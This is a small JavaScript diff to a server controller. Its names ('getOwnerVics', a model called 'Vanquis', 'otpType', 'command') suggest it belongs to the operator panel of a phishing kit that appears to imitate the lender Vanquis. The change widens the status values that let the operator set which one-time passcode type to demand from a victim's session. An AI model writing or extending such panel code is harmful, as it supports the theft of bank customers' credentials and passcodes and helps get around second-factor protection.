@@ -15,7 +15,7 @@ const getOwnerVics = async (req, res) => {
 const command = async (req, res) => {
   const { uniqueid, status, otpType } = req.body;
   try {
-    if (status == 2) {
+    if (status == 2 || status == 3) {
       await Vanquis.findOneAndUpdate({ uniqueid }, { status, otpType }).exec();
     } else {
       await Vanquis.findOneAndUpdate({ uniqueid }, { status }).exec();
